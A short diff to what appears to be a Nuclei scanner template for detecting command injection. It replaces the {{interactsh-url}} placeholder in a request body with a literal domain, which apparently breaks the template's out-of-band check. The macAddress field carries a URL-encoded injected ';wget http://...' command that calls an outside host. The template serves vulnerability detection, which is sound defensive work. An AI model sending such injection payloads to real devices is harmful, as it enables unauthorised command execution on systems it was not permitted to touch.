@@ -23,7 +23,7 @@ http:
         Accept: */*
         Content-Type: application/x-www-form-urlencoded
 
-        macAddress=112233445566%3Bwget+http%3A%2F%2F{{interactsh-url}}%23&reginfo=0&writeData=Submit
+        macAddress=112233445566%3Bwget+http%3A%2F%2Finteractsh-url.com%23&reginfo=0&writeData=Submit
 
     matchers-condition: and
     matchers:
